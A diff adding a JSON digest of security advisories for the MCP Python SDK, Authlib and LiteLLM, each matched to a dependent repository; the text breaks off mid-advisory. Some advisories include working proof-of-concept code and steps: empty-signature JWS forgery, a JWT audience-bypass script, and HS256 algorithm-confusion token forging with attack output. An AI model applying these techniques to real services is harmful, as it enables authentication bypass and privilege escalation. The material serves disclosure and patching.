@@ -1,0 +1,473 @@
+{
+  "generated_at": "2026-10-28T02:13:23.920687Z",
+  "since": "2026-10-27T02:13:23.920680Z",
+  "until": "2026-10-28T02:13:23.920687Z",
+  "entries": [
+    {
+      "advisory": {
+        "id": "GHSA-rwrf-2pqf-9j8j",
+        "source": "osv",
+        "title": "Model Context Protocol Python SDK: Client fetched server-chosen $ref URLs while validating tool results against output schemas",
+        "summary": "### Summary\nIn affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:\n\n- request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and\n- stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.\n\n### Am I affected?\nYes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.\n\nAffected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.\n\nUntil you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T21:05:29Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.30.0",
+          "0..2.2.0",
+          "1.10.0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-rwrf-2pqf-9j8j",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3394",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3396",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/5ebdfed4060d8e5b11b8e2348f86bad4d1fb8836",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/6705402e246dc4eb1fcdf4d9902b78d3c9c36e1b",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-6v38-4h7w-rj9h",
+        "source": "osv",
+        "title": "Authlib: empty signatures validation in JWS JSON deserialization",
+        "summary": "Authlib (prior to 1.9.0) contains a signature verification bypass vulnerability. The JsonWebSignature.deserialize_json() method accepts a JSON Serialization JWS object and returns the payload as successfully verified without checking for a signature and without requiring a cryptographic key.\n\n## Root cause\n\n`authlib/jose/rfc7515/jws.py`, read on the installed 1.8.0 artifact:\n\n```python\nis_valid = True                        # set before anything is checked\nfor header_obj in obj[\"signatures\"]:   # empty array means the body never runs\n    jws_header, valid = self._validate_json_jws(...)\n    if not valid:\n        is_valid = False\n...\nif is_valid:\n    return rv                          # returns the payload as verified\n```\n\n`is_valid` is initialised to `True` and only ever set to `False` from inside the loop. A JWS JSON\nSerialization object whose `signatures` array is empty iterates zero times, so the flag survives and\nthe payload is returned as successfully verified. No key is consulted, because no signature is\nexamined.\n\n## Reproduction\n\n```python\nimport base64\nfrom authlib.jose import JsonWebSignature\n\ndef b64(b):\n    return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\njws = JsonWebSignature()\npayload = b'{\"sub\":\"attacker\",\"role\":\"admin\"}'\nforged = {\"payload\": b64(payload), \"signatures\": []}\n\nprint(jws.deserialize_json(forged, key=None))\n```\n\nObserved on authlib 1.8.0, Python 3.14, clean virtualenv:\n\n```\n[A] ATTACK   general JSON, signatures:[] , key=None\n    ACCEPTED  -> {'header': [], 'payload': b'{\"sub\":\"attacker\",\"role\":\"admin\"}'}\n[B] ATTACK   general JSON, signatures:[] , key=<real key>\n    ACCEPTED  -> {'header': [], 'payload': b'{\"sub\":\"attacker\",\"role\":\"admin\"}'}\n[C] CONTROL+ genuine general JSON with 2 signatures, right key\n    ACCEPTED (expected) payload= b'{\"sub\":\"attacker\",\"role\":\"admin\"}'\n[D] CONTROL- same object, first signature corrupted\n    rejected (expected): BadSignatureError bad_signature:\n[E] CONTROL- signatures array removed entirely (not empty, absent)\n    rejected: DecodeError Missing \"protected\" value:\n```\n\n[C] proves the verifier works normally on a genuine object, so a deployment looks healthy. [D] proves\ntampering is caught. [E] proves this is specifically the empty-array case and not a general\nmissing-member bug. [A] and [B] are the bypass, and [B] shows that holding the correct key does not\nsave a caller: the empty array is accepted either way.\n\nFor comparison, joserfc 1.7.5, the library this module's deprecation warning points users to, rejects\nthe identical object with `BadSignatureError`. The correct behaviour already exists in your newer\nlibrary.\n\n## Impact\n\nAny relying party that calls `JsonWebSignature.deserialize_json()` on input it did not produce will\naccept an attacker-authored payload as signed. Where that payload carries identity or authorisation\nclaims, this is a complete authentication bypass by an unauthenticated remote caller with no key\nmaterial. \n\n## What would fix it\n\nIn `_deserialize_json`, reject an empty `signatures` array before the loop, or initialise the flag\nfrom the signature count, for example `is_valid = len(obj[\"signatures\"]) > 0`. Pull request #938\nproposes the same thing.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T14:50:18Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-6v38-4h7w-rj9h",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-96760",
+          "https://github.com/authlib/authlib/pull/938",
+          "https://github.com/authlib/authlib/commit/6c11a02da8730914cea08ec195f1108a40dc6733",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0",
+          "https://kb.cert.org/vuls/id/762428",
+          "https://www.kb.cert.org/vuls/id/762428"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-7hp6-4w63-5g45",
+        "source": "osv",
+        "title": "LiteLLM: Privilege Escalation to Proxy Admin via Cross-Domain Reuse of the Salt Key",
+        "summary": "### Summary\n\nAn authenticated user with `internal_user` privileges can escalate to `proxy_admin` and achieve remote code execution. The proxy uses one encryption key for two purposes: sealing secrets at rest and minting session tokens. An attacker exploits this by requesting a new API key with a crafted metadata field containing a forged admin credential as the \"secret\" value. The proxy encrypts and returns this payload. When this value is then presented as a bearer token, the proxy decrypts it, trusts the forged admin identity, and grants full administrative access, including the ability to execute arbitrary commands via the MCP stdio endpoint.\n\n### Affected versions\n\nVersions later than 1.91.0 are exploitable in the default configuration. Versions 1.87.0 through 1.90.x are exploitable only if `EXPERIMENTAL_UI_LOGIN=true` was explicitly set.\n\n### Mitigation\n\nUpgrade to a patched version as soon as possible.\n\nIf you cannot upgrade immediately, set `EXPERIMENTAL_UI_LOGIN=false`. This disables the vulnerable authentication path but also breaks CLI SSO and Claude Code gateway login.\n\n### Impact\n\nAn internal user can escalate to proxy admin and execute arbitrary commands on the host.\n\n**Discovery Credit:** Hoa X. Nguyen (OPSWAT Unit 515)",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:04:14Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.100.4",
+          "0..1.101.3",
+          "0..1.102.2",
+          "0..1.103.1",
+          "0..1.104.0rc2",
+          "1.101.0..∞",
+          "1.102.0..∞",
+          "1.103.0..∞",
+          "1.104.0rc1..∞",
+          "1.91.0..∞"
+        ],
+        "references": [
+          "https://github.com/BerriAI/litellm/security/advisories/GHSA-7hp6-4w63-5g45",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114612",
+          "https://github.com/BerriAI/litellm/commit/1d5fdc87fed66b49e1df8cf7d708ad93249eb7d0",
+          "https://github.com/BerriAI/litellm/commit/9161d7f9d6073603ba61ee4aa5e2c0ef5b37a81b",
+          "https://github.com/BerriAI/litellm/commit/9fa1a641119dd0d4fe43e93622eae5f482ceb63f",
+          "https://github.com/BerriAI/litellm/commit/a80eacacee118fbed54e3d98f239d17a63fac818",
+          "https://github.com/BerriAI/litellm/commit/f7cd90f09e9716652b38daec9f0640cdf49d582b",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.100.4",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.101.3",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.102.2",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.103.1",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.104.0-rc.2"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-fch4-3c6x-j4gc",
+        "source": "osv",
+        "title": "Authlib: Default JWT bearer grant accepts assertions for the wrong audience",
+        "summary": "## Description\n\n### Summary\n\nAuthlib's default RFC 7523 JWT bearer grant leaves `get_audiences()` empty, so `verify_claims()` only checks that an `aud` claim *exists* instead of requiring it to match the current authorization server's token endpoint. An attacker holding a legitimately issued JWT assertion for *any* audience can present it to a different authorization server sharing the same signing key and obtain an access token.\n\nTo be completely transparent, AI tools helped surface it. However, we have independently reproduced and carefully validated the issue. We follow responsible disclosure practices and are sharing this privately.\n\n### Affected Entrypoints\n\n- `authlib.oauth2.rfc7523.JWTBearerGrant` — default `get_audiences()` returns empty list\n- `authlib.jose.jwt.decode()` with `claims_options` for audience validation\n- `authlib.integrations.flask_oauth2.ResourceProtector.validate_request()` when audience checking is enabled\n\n### Exploit Path\n\n```\n1. Attacker authenticates to Service A (low-privilege)\n2. Authorization server issues JWT with \"aud\": \"https://evil.test/token\"\n3. Attacker presents this assertion to Service B's token endpoint\n4. Service B uses default JWTBearerGrant (get_audiences() = [])\n5. verify_claims() only checks aud *exists*, not its value\n6. Service B issues an access token — audience bypass achieved\n```\n\n### Proof of Concept\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nDemonstrates that the default JWTBearerGrant accepts JWT assertions\nwhose audience does not match the token endpoint, while a strict\naudience override correctly rejects them.\n\"\"\"\nimport json\nimport os\nimport sys\n\nfrom joserfc.jwk import KeySet, OctKey\n\nWRONG_AUDIENCE = \"https://evil.test/token\"\nEXPECTED_AUDIENCE = \"https://provider.test/token\"\nGRANT_TYPE = \"urn:ietf:params:oauth:grant-type:jwt-bearer\"\n\n\ndef build_and_exercise(strict_audience: bool) -> tuple[int, dict]:\n    from authlib.oauth2.rfc7523 import JWTBearerGrant as BaseJWTBearerGrant\n    # Uses Authlib's own Flask test fixtures\n    from tests.flask.test_oauth2.models import Client, User, db\n    from tests.flask.test_oauth2.oauth2_server import (\n        create_authorization_server, create_flask_app,\n    )\n\n    class JWTBearerGrant(BaseJWTBearerGrant):\n        def resolve_issuer_client(self, issuer):\n            return Client.query.filter_by(client_id=issuer).first()\n\n        def resolve_client_public_key(self, client):\n            return KeySet([\n                OctKey.import_key(\"foo\", {\"kid\": \"1\"}),\n                OctKey.import_key(\"bar\", {\"kid\": \"2\"}),\n            ])\n\n        def authenticate_user(self, subject):\n            return None\n\n        def has_granted_permission(self, client, user):\n            return True\n\n        # Only override get_audiences when testing strict mode\n        if strict_audience:\n            def get_audiences(self):\n                return [EXPECTED_AUDIENCE]\n\n    app = create_flask_app()\n    os.environ[\"AUTHLIB_INSECURE_TRANSPORT\"] = \"true\"\n\n    with app.app_context():\n        db.init_app(app)\n        db.create_all()\n\n        user = User(username=\"demo-user\")\n        db.session.add(user)\n        db.session.commit()\n\n        client = Client(\n            user_id=user.id,\n            client_id=\"client-id\",\n            client_secret=\"client-secret\",\n        )\n        client.set_client_metadata({\n            \"scope\": \"profile\",\n            \"redirect_uris\": [\"https://client.test/authorized\"],\n            \"grant_types\": [GRANT_TYPE],\n        })\n        db.session.add(client)\n        db.session.commit()\n\n        server = create_authorization_server(app)\n        server.register_grant(JWTBearerGrant)\n\n        # Sign assertion with WRONG audience\n        assertion = JWTBearerGrant.sign(\n            \"foo\",\n            issuer=\"client-id\",\n            audience=WRONG_AUDIENCE,  # <-- Not the expected audience\n            subject=None,\n            header={\"alg\": \"HS256\", \"kid\": \"1\"},\n        )\n\n        rv = app.test_client().post(\n            \"/oauth/token\",\n            data={\"grant_type\": GRANT_TYPE, \"assertion\": assertion},\n        )\n        body = json.loads(rv.data)\n        db.session.remove()\n        db.drop_all()\n        return rv.status_code, body\n\n\ndef main() -> int:\n    # Test 1: Default grant (no audience enforcement)\n    vuln_status, vuln_body = build_and_exercise(strict_audience=False)\n\n    # Test 2: Strict audience grant (correct behavior)\n    strict_status, strict_body = build_and_exercise(strict_audience=True)\n\n    result = {\n        \"wrong_audience\": WRONG_AUDIENCE,\n        \"expected_audience\": EXPECTED_AUDIENCE,\n        \"vulnerable_status\": vuln_status,\n        \"vulnerable_body\": vuln_body,\n        \"strict_status\": strict_status,\n        \"strict_body\": strict_body,\n    }\n    print(json.dumps(result, indent=2, sort_keys=True))\n\n    if (\n        vuln_status == 200\n        and \"access_token\" in vuln_body\n        and strict_body.get(\"error\") == \"invalid_grant\"\n    ):\n        print(\n            \"POC_SUCCESS: default JWTBearerGrant issued an access token for \"\n            \"an assertion whose aud did not match the token endpoint, while \"\n            \"strict audience validation rejected the same assertion.\"\n        )\n        return 0\n\n    print(\"POC_FAILURE: expected token issuance under default grant \"\n          \"and invalid_grant under strict audience control.\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\n### Observed Result\n\n- **Default grant (vulnerable):** HTTP 200, `access_token` issued despite `aud: \"https://evil.test/token\"`\n- **Strict grant (fixed):** HTTP 400, `error: \"invalid_grant\"` — correctly rejects mismatched audience\n- Confirms the default `get_audiences()` returns empty, so audience validation is effectively skipped\n\n### Impact\n\n- **Vulnerability Type:** CWE-287 — Improper Authentication\n- An attacker with a valid JWT assertion for *any* service can use it to obtain tokens from a *different* service sharing the same signing keys\n- Particularly dangerous in **microservice architectures** where services share identity infrastructure\n- Enables unauthorized access escalation across trust boundaries\n- The vulnerability is in the *default behavior* — most integrations won't override `get_audiences()`\n---\n### Credit\nReported by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.\nLiyi Zhou: https://lzhou1110.github.io/\nZiyue Wang: https://zyy0530.github.io/\nStrick: https://str1ckl4nd.github.io/\nMaurice: https://maurice.busystar.org/\nChenchen Yu: https://7thparkk.github.io/",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:39:08Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-fch4-3c6x-j4gc",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114618",
+          "https://github.com/authlib/authlib/pull/945",
+          "https://github.com/authlib/authlib/commit/e3bd41cb29dcfee434453b135ffb487884baeedf",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-5h93-6whr-6q8j",
+        "source": "osv",
+        "title": "Model Context Protocol Python SDK: HTTP client transports followed cross-origin redirects carrying custom headers and bodies",
+        "summary": "### Summary\nIn affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:\n\n- custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and\n- on a `307` or `308` redirect the request body was re-sent there too.\n\nThe SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.\n\nA lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.\n\nAnyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.\n\n### Am I affected?\nYes, if your code uses the SDK as an MCP client over HTTP through any of:\n\n- `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL)\n- `streamablehttp_client` or `sse_client`\n- `ClientSessionGroup` with HTTP server parameters\n- the internal `create_mcp_http_client` helper\n\nThis includes an HTTP client you passed in yourself with `follow_redirects=True`.\n\nAffected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected:\n\n- MCP servers\n- stdio clients\n- a client you supplied with `follow_redirects` left at its default of `False`\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.\n\nThe transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.\n\nIf your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.\n\nUntil you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.\n\n<details>\n<summary>If you genuinely need the old behaviour (unsupported)</summary>\n\nThis restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:\n\n```python\nimport httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead\n\nclass FollowRedirectsAnyway(httpx2.AsyncClient):\n    \"\"\"Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection.\"\"\"\n\n    async def send(self, request, *, follow_redirects=False, **kwargs):\n        return await super().send(request, follow_redirects=True, **kwargs)\n\nhttp_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))\n# streamable_http_client(url, http_client=http_client)\n\n# sse_client / streamablehttp_client take a factory instead:\ndef client_factory(headers=None, timeout=None, auth=None):\n    return FollowRedirectsAnyway(headers=headers, auth=auth,\n                                 timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300))\n# sse_client(url, httpx_client_factory=client_factory)\n```\n\nThe redirect handling is then the HTTP library's own, as before the fix: a lone `Authorization` header is still dropped on cross-origin hops and `301`/`302`/`303` become `GET`. It is not something the SDK supports or tests.\n\n</details>\n\n---",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T21:05:34Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.30.0",
+          "0..2.2.0",
+          "1.8.0..∞",
+          "2.0.0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-5h93-6whr-6q8j",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3397",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3448",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/2106335745563b2321b8c73fef2c12903d00aa6e",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/c6762e821c527925f0b617db216d00fbd1d0bf99",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-7vr2-2fgp-9w7p",
+        "source": "osv",
+        "title": "Authlib incomplete algorithm-confusion fix permits HMAC forgery with prefixed public keys",
+        "summary": "## Summary\n\n`OctKey.import_key()` carries the only guard that stops an asymmetric public key from being used as an\nHMAC secret in `authlib.jose`. That guard is `raw_key.startswith(POSSIBLE_UNSAFE_KEYS)` — anchored at\nbyte 0 — while the loader that consumes the identical bytes on the asymmetric path\n(`cryptography.hazmat.primitives.serialization.load_pem_public_key` / `load_pem_x509_certificate`)\nskips anything before the `-----BEGIN` line. A PEM public key or X.509 certificate carrying **one\nleading byte** — a newline, a space, four spaces of indentation, a UTF-8 BOM, or a comment line — is\ntherefore not recognised, falls through, and becomes the HMAC secret. An attacker holding only the\nissuer's public key then mints an `HS256` token with arbitrary claims that `jwt.decode()` accepts as\nauthentic.\n\nThis is an incomplete fix of **CVE-2024-37568 / GHSA-5357-c2jx-v7qh**. That advisory's fix is exactly\nthis guard (`git log -S 'POSSIBLE_UNSAFE_KEYS' -- authlib/jose/rfc7518/oct_key.py` returns a single\ncommit, `3bea812` \"fix: prevent OctKey to import ssh/rsa/pem keys\", referencing issue #654), and the\noriginal attack works again unchanged whenever the stored PEM does not start at offset 0.\n\nReproduced end-to-end on **1.8.0**, the newest release (published 2026-08-30), and on `origin/main`\n(`c529a61`), with `cryptography` 50.0.2.\n\n## Preconditions\n\nBoth are deployment properties; neither is attacker-controlled at request time, and the attacker needs\nno secret and no user interaction.\n\n1. **The relying party uses the documented module-level `jwt` object.** `from authlib.jose import jwt`\n   is built at `authlib/jose/__init__.py:55-72` with the full list\n   `[\"HS256\",\"HS384\",\"HS512\",\"RS256\",...,\"EdDSA\"]`, and `JsonWebToken.decode`\n   (`authlib/jose/rfc7519/jwt.py:80`) exposes **no `algorithms` parameter**, so a caller of the\n   documented object has no way to narrow it. This is the first code sample in\n   `docs/jose/jwt.rst:21-31`.\n\n   This hazard is already documented: `docs/jose/jwt.rst:73-79` says\n   \"This decoding method is insecure. By default `jwt.decode` parses the alg header. This allows\n   symmetric macs and asymmetric signatures.\", and `docs/jose/jwt.rst:94-98` says \"You should never\n   combine symmetric (HS) and asymmetric (RS, ES, PS) signature schemes.\" The point of this report is\n   **not** that the mixed list exists — it is that the `oct_key.py:81` backstop shipped for precisely\n   that documented hazard does not hold.\n\n2. **The verification key is passed as PEM/certificate text whose bytes do not begin at offset 0 with\n   `-----BEGIN `.** Each of the following forms was confirmed to forge, and each also still verifies a\n   genuine RS256/ES256 token with the identical bytes, so nothing in the deployment looks broken:\n   * one leading newline — what a triple-quoted Python literal produces\n   * one leading space\n   * four-space indentation — an indented YAML/JSON/TOML config block\n   * a UTF-8 BOM — a Windows-editor artifact\n   * a leading comment line\n   * all of the above applied to an X.509 `CERTIFICATE` PEM instead of a `PUBLIC KEY` PEM\n\n   A raw DER SPKI blob also bypasses the guard, but DER cannot be used for genuine asymmetric\n   verification through this path, so I exclude it as a non-deployable configuration and mention it\n   only as further evidence of the recogniser/loader gap.\n\n## Details\n\n`authlib/jose/rfc7518/oct_key.py:10-17`\n\n```python\nPOSSIBLE_UNSAFE_KEYS = (\n    b\"-----BEGIN \",\n    b\"---- BEGIN \",\n    b\"ssh-rsa \",\n    b\"ssh-dss \",\n    b\"ssh-ed25519 \",\n    b\"ecdsa-sha2-\",\n)\n```\n\n`authlib/jose/rfc7518/oct_key.py:78-84`\n\n```python\nraw_key = to_bytes(raw)\n\n# security check\nif raw_key.startswith(POSSIBLE_UNSAFE_KEYS):\n    raise ValueError(\"This key may not be safe to import\")\n\nkey = cls(raw_key=raw_key, options=options)\n```\n\n`bytes.startswith` is anchored. The loader on the asymmetric path is not:\n`authlib/jose/rfc7517/_cryptography_key.py:22-29` calls `load_pem_public_key` /\n`load_pem_x509_certificate`, both of which scan forward for the armour header. So the set of byte\nstrings the recogniser rejects is strictly smaller than the set the loader accepts, and the difference\nis exploitable.\n\nReach, for a caller of the documented object:\n\n* `authlib/jose/rfc7518/jws_algs.py:59` — `HMACAlgorithm.prepare_key(raw_data)` returns\n  `OctKey.import_key(raw_data)`; this is the whole of the HMAC key handling.\n* `authlib/jose/rfc7519/jwt.py:80` — `JsonWebToken.decode(self, s, key, claims_cls=None,\n  claims_options=None, claims_params=None)`; the algorithm comes from the token header and is checked\n  only against the instance's list.\n* `authlib/jose/__init__.py:55-72` — that list contains both HS\\* and RS\\*/ES\\*/PS\\*/EdDSA.\n\nSo `oct_key.py:81` is the only thing between a mixed allow-list and using the public key as an HMAC\nsecret, and it is bypassed by a single leading byte.\n\n## PoC\n\n`poc-authlib-e2e-http.py` stands up a Flask API whose only authentication is the documented\n`jwt.decode(token, PUBLIC_KEY)`, where `PUBLIC_KEY` is the issuer's RSA public key embedded as a\ntriple-quoted Python literal (hence one leading newline). The attacker is given **only** that public\nkey.\n\n```\nauthlib=1.8.0 cryptography=50.0.2 flask=3.1.3\nguard  = authlib/jose/rfc7518/oct_key.py:81   raw_key.startswith(POSSIBLE_UNSAFE_KEYS)\ncall   = authlib/jose/rfc7519/jwt.py:80       JsonWebToken.decode(s, key)  [no `algorithms` param]\nalgs   = authlib/jose/__init__.py:55+         module-level jwt = JsonWebToken([HS256..RS256..ES256..])\n\n[baseline 1] genuine RS256 token, role=user            -> (403, '{\"error\":\"not admin\",\"sub\":\"alice\"}')\n[baseline 2] genuine RS256 token, role=admin           -> (200, '{\"data\":\"DB_ROOT_PASSWORD=hunter2; STRIPE_SK=sk_live_deadbeef\",\"ok\":true,\"sub\":\"root\"}')\n[CONTROL 1 ] payload tampered, RS256 sig kept          -> (401, '{\"error\":\"BadSignatureError: bad_signature: \"}')\n[CONTROL 2 ] HS256 forged with CANONICAL pubkey        -> BLOCKED at key import: ValueError: This key may not be safe to import\n[CONTROL 3 ] JsonWebToken(['RS256']) vs forged token   -> REJECTED: UnsupportedAlgorithmError\n\nATTACKER INPUT: only IDP_PUB_CANONICAL (public by definition), no private key.\nforged token header: {'alg': 'HS256', 'typ': 'JWT'}\n[ATTACK    ] HS256 forged with the PUBLIC key          -> (200, '{\"data\":\"DB_ROOT_PASSWORD=hunter2; STRIPE_SK=sk_live_deadbeef\",\"ok\":true,\"sub\":\"attacker\"}')\n```\n\nThe three controls establish that the guard does work on a canonical PEM (so the leading byte is\nload-bearing), that ordinary signature verification is intact, and that pinning the algorithm is an\neffective mitigation.\n\nPer-form matrix, both key types, with a control proving genuine asymmetric verification still succeeds\non the exact same bytes:\n\n```\n### RSA-2048/RS256\n  canonical PEM  (CONTROL A)   loader=load_pem_public_key  startswith_guard=True  RS/ES-verify=OK   BLOCKED:ValueError\n  indented PEM   (4 spaces)    loader=load_pem_public_key  startswith_guard=False RS/ES-verify=OK   FORGED sub=superadmin role=admin\n  UTF-8 BOM prefix             loader=load_pem_public_key  startswith_guard=False RS/ES-verify=OK   FORGED sub=superadmin role=admin\n  leading comment line         loader=load_pem_public_key  startswith_guard=False RS/ES-verify=OK   FORGED sub=superadmin role=admin\n  leading blank line           loader=load_pem_public_key  startswith_guard=False RS/ES-verify=OK   FORGED sub=superadmin role=admin\n  leading single space         loader=load_pem_public_key  startswith_guard=False RS/ES-verify=OK   FORGED sub=superadmin role=admin\n  DER (SPKI) bytes             loader=load_der_public_key  startswith_guard=False RS/ES-verify=FAIL  FORGED sub=superadmin role=admin\n  [CONTROL C] JsonWebToken(['RS256']).decode(forged HS256) -> REJECTED:UnsupportedAlgorithmError\n\n### EC-P256/ES256\n  identical results for all seven rows\n\nSame five leading-byte forms applied to an X.509 CERTIFICATE PEM: also FORGED, RS256-verify=OK.\n```\n\n### Steps to reproduce\n\n1. `pip install authlib==1.8.0 cryptography flask requests`\n2. Generate an RSA-2048 keypair; serialise the public key to PEM and prepend a single newline\n   (or indent it, or prepend a BOM or a comment line).\n3. Confirm `authlib.jose.rfc7518.oct_key.POSSIBLE_UNSAFE_KEYS` does not match those bytes with\n   `startswith`, while `cryptography.hazmat.primitives.serialization.load_pem_public_key` loads them.\n4. `from authlib.jose import jwt` then\n   `tok = jwt.encode({\"alg\":\"HS256\"}, {\"sub\":\"attacker\",\"role\":\"admin\"}, mutated_pem)`\n5. `jwt.decode(tok, mutated_pem)` — verification succeeds and the claims are returned.\n\n## Impact\n\nCryptographic signature-verification bypass leading to authentication bypass (CWE-347, algorithm\nconfusion). An unauthenticated attacker who knows only the issuer's public verification key — public by\ndefinition, normally served at `/.well-known/jwks.json` or in IdP metadata — forges tokens with\narbitrary claims, including administrative roles and arbitrary subjects. In the PoC this yields an HTTP\n200 and the application's admin secrets for `sub=attacker`.\n\nAuthlib had **103,356,930** PyPI downloads in the last month (pypistats `/api/packages/authlib/recent`,\nread 2026-10-01), which is why I am reporting a bypass of a guard rather than only the documented\nfootgun it backstops.\n\nTwo notes for triage, in the interest of completeness:\n\n* `authlib.jose` emits `AuthlibDeprecationWarning` (\"please use joserfc instead. It will be compatible\n  before version 